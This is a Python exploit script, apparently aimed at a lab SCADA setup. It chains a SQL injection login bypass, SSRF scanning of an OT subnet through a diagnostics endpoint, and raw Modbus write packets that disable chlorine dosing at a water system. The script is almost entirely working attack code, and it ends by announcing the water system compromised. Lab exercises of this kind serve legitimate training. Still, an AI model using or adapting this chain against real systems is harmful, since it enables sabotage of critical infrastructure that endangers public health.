#!/usr/bin/env python3
import requests
from pwn import *

# Configuration
BASE_URL = "http://localhost:8000"
SQLI_URL = f"{BASE_URL}/api/v1/login/sqli"
DIAGNOSTICS_URL = f"{BASE_URL}/api/v1/diagnostics/check-host"

# pwntools logger
exploit_log = log.progress("SCADA Exploit Chain")

def bypass_authentication():
    """
    Step 1: Authentication Bypass via SQL Injection
    Target: /api/v1/login/sqli
    Technique: Case manipulation to bypass keyword blacklist.
    """
    exploit_log.status("Starting Stage 1: SQL Injection Bypass...")
    
    # Payload targeting the 'username' field. 
    # Use '||' to bypass 'OR' in the blacklist.
    payload_username = "admin' || '1'='1"
    payload_password = "anything"
    
    data = {
        "username": payload_username,
        "password": payload_password
    }
    
    try:
        response = requests.post(SQLI_URL, json=data)
        if response.status_code == 200 and "success" in response.json().get("status", ""):
            session_cookie = response.cookies.get("session_id")
            exploit_log.success(f"Stage 1 Successful! Session Cookie: {session_cookie}")
            return session_cookie
        else:
            exploit_log.failure(f"Stage 1 Failed: {response.text}")
            return None
    except Exception as e:
        exploit_log.failure(f"Stage 1 Error: {str(e)}")
        return None

def discover_plc(session_id):
    exploit_log.status("Starting Stage 2: SSRF Discovery...")
    
    # In this lab, the OT network is 192.168.10.0/24
    networks = ["192.168.10.{i}"]
    cookies = {"session_id": session_id}
    
    for net in networks:
        for i in range(1, 10): # We know the PLC is at .5
            target_ip = net.format(i=i)
            exploit_log.status(f"Scanning {target_ip}...")
            
            try:
                response = requests.post(DIAGNOSTICS_URL, json={"host": target_ip}, cookies=cookies, timeout=2)
                if response.status_code == 200:
                    json_data = response.json()
                    if json_data.get("status") == "up":
                        exploit_log.success(f"Stage 2 Successful! PLC Found at: {target_ip}")
                        return target_ip
            except Exception:
                continue
                
    exploit_log.failure("Stage 2 Failed: PLC not found.")
    return None

def disable_chlorine(plc_ip):
    exploit_log.status(f"Starting Stage 3: Disabling Chlorine on {plc_ip}...")
    
    # LAB MAPPING: Since the PLC is in a container but we've mapped 502 to localhost
    modbus_host = "localhost" if "192.168.10" in plc_ip else plc_ip
    target_registers = [19, 20]
    
    for reg in target_registers:
        exploit_log.status(f"Sending FC6 to Register {reg} on {modbus_host}...")
        
        # Modbus TCP Packet (Big Endian)
        packet = p16(0x0001, endian='big') + \
                 p16(0x0000, endian='big') + \
                 p16(0x0006, endian='big') + \
                 p8(0x01) + \
                 p8(0x06) + \
                 p16(reg, endian='big') + \
                 p16(0x0000, endian='big')
        
        try:
            io = remote(modbus_host, 502, timeout=2)
            io.send(packet)
            
            response = io.recvn(12, timeout=2) 
            if response and response[7:8] == b'\x06':
                exploit_log.success(f"Stage 3 Successful! Chlorine disabled via Register {reg} on {plc_ip}.")
                io.close()
                return True
            io.close()
        except Exception:
            continue
            
    exploit_log.failure("Stage 3 Failed: Could not modify PLC state.")
    return False

if __name__ == "__main__":
    try:
        session = bypass_authentication()
        if session:
            plc_ip = discover_plc(session)
            if plc_ip:
                if disable_chlorine(plc_ip):
                    exploit_log.success("ATTACK COMPLETE: WATER SYSTEM COMPROMISED")
                else:
                    print("\n[!] Exploit failed at Stage 3.")
            else:
                print("\n[!] Exploit failed at Stage 2.")
        else:
            print("\n[!] Exploit failed at Stage 1.")
    except KeyboardInterrupt:
        exploit_log.failure("Exploit aborted by user.")
